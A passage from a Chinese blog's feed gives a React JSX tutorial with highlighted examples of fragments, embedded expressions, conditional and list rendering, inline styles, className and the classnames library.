class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. 使用&lt;&gt;&lt;/&gt;可以避免没必要的标签产生 简写 React.Fragment</span></span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;&gt;</span><br><span class="line">    &lt;div&gt;header&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;footer&lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp">ReactDom.render(element, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><ul><li>用小括号</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有换行的时候最好使用()可以让标签对其，避免没必要的错误</span></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;&gt;</span><br><span class="line">    &lt;div&gt;header&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;footer&lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure><h2 id="JSX-嵌入表达式"><a href="#JSX-嵌入表达式" class="headerlink" title="JSX 嵌入表达式"></a>JSX 嵌入表达式</h2><p>在<strong><code>JSX</code></strong>中使用<strong>{ }</strong>嵌入<code>JS</code>表达式，注意不能使用语句。</p><ul><li>展示数据</li><li>进行运算</li><li>三元运算</li><li>使用函数</li><li>使用 JSX</li><li>使用注释</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据</span></span><br><span class="line"><span class="keyword">const</span> data = &#123;</span><br><span class="line">  name: <span class="string">'tom'</span>,</span><br><span class="line">  age: <span class="number">18</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="keyword">const</span> up = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> data.name.toUpperCase();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jsx表达式</span></span><br><span class="line"><span class="keyword">const</span> list = (</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li&gt;jack&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;tony&lt;/</span>li&gt;</span><br><span class="line">  &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const element = (</span></span><br><span class="line"><span class="regexp">  &lt;div&gt;</span></span><br><span class="line"><span class="regexp">    &#123;/</span>* <span class="number">1.</span> 使用数据  注释推荐快键键(ctrl+<span class="regexp">/)  */</span>&#125;</span><br><span class="line">    &lt;div&gt;姓名：&#123;data.name&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;年龄：&#123;data.age&#125;&lt;/</span>div&gt;</span><br><span class="line">    &#123;<span class="comment">/* 2. 使用运算 */</span>&#125;</span><br><span class="line">    &lt;div&gt;明年几岁：&#123;data.age + <span class="number">1</span>&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &#123;/</span>* <span class="number">3.</span> 使用三元 *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;是否成年：&#123;data.age &gt; 16 ? '是' : '否'&#125;&lt;/</span>div&gt;</span><br><span class="line">    &#123;<span class="comment">/* 4. 使用函数 */</span>&#125;</span><br><span class="line">    &lt;div&gt;姓名大写：&#123;up()&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &#123;/</span>* <span class="number">5.</span> 使用JSX(jsx也是表达式) *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;朋友：&#123;list&#125;&lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ReactDom.render(element, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><h2 id="JSX-条件渲染"><a href="#JSX-条件渲染" class="headerlink" title="JSX 条件渲染"></a>JSX 条件渲染</h2><ul><li>使用分支语句 <strong><code>if/else</code></strong> 完成条件渲染</li><li>使用 <strong><code>三元运算符</code></strong> 完成条件渲染</li><li>使用 <strong><code>逻辑运算符</code></strong> 完成条件渲染</li></ul><h3 id="if-else-条件渲染"><a href="#if-else-条件渲染" class="headerlink" title="if/else 条件渲染"></a>if/else 条件渲染</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loading = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能在JSX中写语句，但，可以充分利用JS能力</span></span><br><span class="line"><span class="keyword">const</span> getContent = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (loading) &#123;</span><br><span class="line">    <span class="keyword">return</span> &lt;div&gt;正在加载...&lt;/div&gt;;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &lt;div&gt;数据加载完毕，这是显示数据&lt;/div&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = &lt;div&gt;&#123;getContent()&#125;&lt;/div&gt;;</span><br></pre></td></tr></table></figure><h3 id="三元运算符-完成条件渲染"><a href="#三元运算符-完成条件渲染" class="headerlink" title="三元运算符 完成条件渲染"></a>三元运算符 完成条件渲染</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loading = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &#123;loading ? &lt;div&gt;正在加载...&lt;/div&gt; : &lt;div&gt;数据加载完毕，这是显示数据&lt;/div&gt;&#125;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure><h3 id="逻辑运算-完成条件渲染"><a href="#逻辑运算-完成条件渲染" class="headerlink" title="逻辑运算 完成条件渲染"></a>逻辑运算 完成条件渲染</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loading = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &#123;loading &amp;&amp; &lt;div&gt;正在加载...&lt;/div&gt;&#125;</span><br><span class="line">    &#123;loading || &lt;div&gt;数据加载完毕，这是显示数据&lt;/div&gt;&#125;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure><h2 id="JSX-列表渲染"><a href="#JSX-列表渲染" class="headerlink" title="JSX 列表渲染"></a>JSX 列表渲染</h2><ul><li>可以渲染 <strong><code>JSX</code></strong> 数组</li><li>使用 <strong><code>map</code></strong> 渲染列表</li><li>直接在 <strong><code>JSX</code></strong> 中使用 <strong><code>map</code></strong> 渲染列表</li><li><strong><code>key</code></strong> 属性使用</li></ul><h3 id="可以渲染-JSX-数组"><a href="#可以渲染-JSX-数组" class="headerlink" title="可以渲染 JSX 数组"></a>可以渲染 JSX 数组</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. const list = ['tom', 'jack', 'tony'] 把数组转换成如下JSX数组</span></span><br><span class="line"><span class="keyword">const</span> list = [&lt;li&gt;tom&lt;/li&gt;, &lt;li&gt;jack&lt;<span class="regexp">/li&gt;, &lt;li&gt;tony&lt;/</span>li&gt;];</span><br><span class="line"><span class="comment">// 2. 把JSX嵌入在UL标签中</span></span><br><span class="line"><span class="keyword">const</span> elemet = &lt;ul&gt;&#123;list&#125;&lt;/ul&gt;;</span><br></pre></td></tr></table></figure><h3 id="使用-map-渲染列表"><a href="#使用-map-渲染列表" class="headerlink" title="使用 map 渲染列表"></a>使用 map 渲染列表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 数据</span></span><br><span class="line"><span class="keyword">const</span> list = [<span class="string">'tom'</span>, <span class="string">'jack'</span>, <span class="string">'tony'</span>];</span><br><span class="line"><span class="comment">// 2. 转jsx数组</span></span><br><span class="line"><span class="keyword">const</span> list2 = list.map(<span class="function">(<span class="params">item</span>) =&gt;</span> &lt;li&gt;&#123;item&#125;&lt;<span class="regexp">/li&gt;);</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 3. 使用</span></span><br><span class="line"><span class="regexp">const element = &lt;ul&gt;&#123;list2&#125;&lt;/u</span>l&gt;;</span><br></pre></td></tr></table></figure><h3 id="直接在-JSX-中使用-map-渲染列表"><a href="#直接在-JSX-中使用-map-渲染列表" class="headerlink" title="直接在 JSX 中使用 map 渲染列表"></a>直接在 JSX 中使用 map 渲染列表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 数据</span></span><br><span class="line"><span class="keyword">const</span> list = [<span class="string">'tom'</span>, <span class="string">'jack'</span>, <span class="string">'tony'</span>];</span><br><span class="line"><span class="comment">// 2. 使用 map调用其实也是js表达式</span></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &#123;list.map(<span class="function">(<span class="params">item</span>) =&gt;</span> (</span><br><span class="line">      &lt;li&gt;&#123;item&#125;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    ))&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/u</span>l&gt;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="key-属性使用"><a href="#key-属性使用" class="headerlink" title="key 属性使用"></a>key 属性使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Warning: Each child in a list should have a unique "key" prop.</span></span><br><span class="line"><span class="comment">// 1. 数据</span></span><br><span class="line"><span class="keyword">const</span> list = [<span class="string">'tom'</span>, <span class="string">'jack'</span>, <span class="string">'tony'</span>];</span><br><span class="line"><span class="comment">// 2. 使用</span></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &#123;list.map(<span class="function">(<span class="params">item</span>) =&gt;</span> (</span><br><span class="line">      &lt;li key=&#123;item&#125;&gt;&#123;item&#125;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    ))&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/u</span>l&gt;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="JSX-样式-style-方式"><a href="#JSX-样式-style-方式" class="headerlink" title="JSX 样式 - style 方式"></a>JSX 样式 - style 方式</h2><ul><li><strong><code>style</code></strong> 接受一个采用<strong>小驼峰</strong>命名属性的 <code>JavaScript</code> 对象，而不是 <code>CSS</code> 字符串</li><li><strong><code>style</code></strong> 中的 <code>key</code> 采用<strong>小驼峰</strong>命名是为了与 <code>JS</code> 访问 <code>DOM</code> 节点的属性保持一致</li><li><strong><code>React</code></strong> 会自动添加 ”px” 后缀到内联样式为数字的属性后，其他单位需要手动添加</li></ul><p>演示代码</p><ul><li>需求：去掉上一个列表案例 <code>ul</code> 的点，加上背景样式，设置字体大小，给第一个 <code>p</code> 设置两倍字体大小</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 数据</span></span><br><span class="line"><span class="keyword">const</span> list = [</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">100</span>, <span class="attr">name</span>: <span class="string">'tom'</span>, <span class="attr">age</span>: <span class="number">15</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">101</span>, <span class="attr">name</span>: <span class="string">'jack'</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">102</span>, <span class="attr">name</span>: <span class="string">'tony'</span>, <span class="attr">age</span>: <span class="number">20</span> &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">+<span class="comment">// 2. 样式</span></span><br><span class="line">+<span class="keyword">const</span> styleObject = &#123;</span><br><span class="line">+  listStyle: <span class="string">'none'</span>,</span><br><span class="line">+  backgroundColor: <span class="string">'pink'</span>,</span><br><span class="line">+  fontSize: <span class="number">20</span></span><br><span class="line">+&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 使用</span></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">+  &lt;ul style=&#123;styleObject&#125; &gt;</span><br><span class="line">    &#123;list.map(item =&gt; &#123;</span><br><span class="line">      return (</span><br><span class="line">        &lt;li key=&#123;item.id&#125;&gt;</span><br><span class="line">+          &lt;p style=&#123;&#123;fontSize: '2em'&#125;&#125;&gt;姓名：&#123;item.name&#125;&lt;/p&gt;</span><br><span class="line">          &lt;p&gt;是否成年：&#123;item.age &gt; 16 ? '是' : '否'&#125;&lt;/p&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">      )</span><br><span class="line">    &#125;)&#125;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>))</span><br></pre></td></tr></table></figure><h2 id="JSX-样式-className-方式"><a href="#JSX-样式-className-方式" class="headerlink" title="JSX 样式 - className 方式"></a>JSX 样式 - className 方式</h2><blockquote><p>在多数情况下，应使用 <strong><code>className</code></strong> 属性来引用外部 <code>CSS</code> 样式表中定义的 <code>class</code></p></blockquote><ul><li><strong><code>className</code></strong> 设置类名，和 <code>class</code> 属性要求一样只能是字符串</li><li>如果需要根据数据设置类名，可以使用 <strong><code>{ }</code></strong> 嵌入 <code>JS</code> 表达式实现</li></ul><p>演示代码：</p><ul><li>需求：在元素 <code>button</code>上根据 <code>isActive</code> 数据的值添加 <code>active</code> 类名</li></ul><p>index.css 代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.button</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">10px</span> <span class="number">#ccc</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  <span class="attribute">user-select</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.button</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#069</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#069</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.button</span><span class="selector-class">.block</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.js 代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="comment">// 在src下新建index.css文件，导入进来即可</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./index.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isActive = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;span className=&#123;<span class="string">`button <span class="subst">$&#123;isActive ? <span class="string">'active'</span> : <span class="string">''</span>&#125;</span>`</span>&#125;&gt;按钮&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ReactDom.render(element, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><h2 id="JSX-样式-动态-className"><a href="#JSX-样式-动态-className" class="headerlink" title="JSX 样式 - 动态 className"></a>JSX 样式 - 动态 className</h2><ul><li>在使用 <strong><code>className</code></strong> 的时候遇见多个类名动态绑定，可以模仿 <code>vue</code> 使用对象的方式</li><li><strong><code>vue</code></strong> 中绑定类名的时候使用 <code>{类名:布尔}</code> 用布尔值决定是否加上这个类名</li></ul><p>例如：在元素 <code>button</code>上根据 <code>isActive</code> 数据的值添加 <code>active</code> 类名，<code>isBlock</code> 数据的值添加 <code>block</code> 类名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'./index.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据</span></span><br><span class="line"><span class="keyword">const</span> isActive = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">const</span> isBlock = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类名对象</span></span><br><span class="line"><span class="keyword">const</span> classObject = &#123;</span><br><span class="line">  button: <span class="literal">true</span>,</span><br><span class="line">  active: isActive,</span><br><span class="line">  block: isBlock,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换成字符串</span></span><br><span class="line"><span class="keyword">const</span> className = <span class="built_in">Object</span>.keys(classObject)</span><br><span class="line">  .filter(<span class="function">(<span class="params">key</span>) =&gt;</span> classObject[key])</span><br><span class="line">  .join(<span class="string">' '</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = &lt;span className=&#123;className&#125;&gt;按钮&lt;/span&gt;;</span><br><span class="line"></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><h2 id="JSX-样式-classnames-库"><a href="#JSX-样式-classnames-库" class="headerlink" title="JSX 样式 - classnames 库"></a>JSX 样式 - classnames 库</h2><p>使用 <code>JS</code> 原生的能力处理多个类名的动态绑定，当然这样的需求已经有 <strong><code>classnames</code></strong> 库给我们解决了。</p><h3 id="安装导入-classnames"><a href="#安装导入-classnames" class="headerlink" title="安装导入 classnames"></a>安装导入 classnames</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">npm i classnames</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者 </span></span><br><span class="line">yarn add classnames</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入</span></span><br><span class="line"><span class="keyword">import</span> classNames <span class="keyword">from</span> <span class="string">'classnames'</span></span><br></pre></td></tr></table></figure><h3 id="认识-classnames-API"><a href="#认识-classnames-API" class="headerlink" title="认识 classnames API"></a>认识 classnames API</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 使用字符串</span></span><br><span class="line">classNames(<span class="string">'foo'</span>, <span class="string">'bar'</span>); <span class="comment">// foo bar</span></span><br><span class="line"><span class="comment">// 2. 使用对象</span></span><br><span class="line">classNames(&#123; <span class="attr">foo</span>: <span class="literal">true</span>, <span class="attr">bar</span>: <span class="literal">true</span> &#125;); <span class="comment">// foo bar</span></span><br><span class="line"><span class="comment">// 3. 使用数组</span></span><br><span class="line">classNames([<span class="string">'foo'</span>, <span class="string">'bar'</span>]); <span class="comment">// foo bar</span></span><br><span class="line"><span class="comment">// 4. 混合使用</span></span><br><span class="line">classNames(<span class="string">'foo'</span>, &#123; <span class="attr">bar</span>: <span class="literal">true</span> &#125;); <span class="comment">// foo bar</span></span><br></pre></td></tr></table></figure><p>例如还是上面那个需求：在元素 <code>button</code>上根据 <code>isActive</code> 数据的值添加 <code>active</code> 类名，<code>isBlock</code> 数据的值添加 <code>block</code> 类名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="comment">// 1. 导入classnames</span></span><br><span class="line"><span class="keyword">import</span> classNames <span class="keyword">from</span> <span class="string">'classnames'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'./index.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 数据</span></span><br><span class="line"><span class="keyword">const</span> isActive = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">const</span> isBlock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 产生类名</span></span><br><span class="line"><span class="keyword">const</span> className = classNames(<span class="string">'button'</span>, &#123;</span><br><span class="line">  active: isActive,</span><br><span class="line">  block: isBlock,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = &lt;span className=&#123;className&#125;&gt;按钮&lt;/span&gt;;</span><br><span class="line"></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;JSX-基本概念&quot;&gt;&lt;a href=&quot;#JSX-基本概念&quot; class=&quot;headerlink&quot; title=&quot;JSX 基本概念&quot;&gt;&lt;/a&gt;JSX 基本概念&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;JSX&lt;/code&gt; 是 &lt;code&gt;JavaScri
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="JSX" scheme="//www.shen.ee/tags/JSX/"/>
    
      <category term="JSX语法" scheme="//www.shen.ee/tags/JSX%E8%AF%AD%E6%B3%95/"/>
    
      <category term="XML" scheme="//www.shen.ee/tags/XML/"/>
    
  </entry>
  
  <entry>
    <title>React快速上手</title>
    <link href="//www.shen.ee/article/44037.html"/>
    <id>//www.shen.ee/article/44037.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:25.998Z</updated>
    
